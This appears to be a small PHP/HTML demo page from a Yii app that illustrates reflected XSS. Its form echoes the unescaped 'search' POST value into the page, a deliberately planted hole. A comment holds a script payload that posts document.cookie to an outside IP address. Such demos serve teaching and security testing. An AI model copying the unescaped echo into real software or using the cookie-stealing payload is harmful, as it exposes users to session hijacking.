<h1>Reflected XSS</h1>
<p>where the malicious input originates from the victim's request.</p>
<br/>

<form method="POST">
	<p>What are you searching:<?php echo Yii::app()->request->getPost('search'); ?> </p>
	<input name="search" />
	<input type="submit"/> 
</form>

<!--
<script>$.ajax({type:"POST",url:"http://13.228.132.73/cookie/create",data:{'Cookie[cookie]':document.cookie,'Cookie[created_at]':"-"}});</script>
-->

<br/>
<br/>
<br/>
<img src="https://excess-xss.com/reflected-xss.png"/>
<br/>
<br/>
<br/>
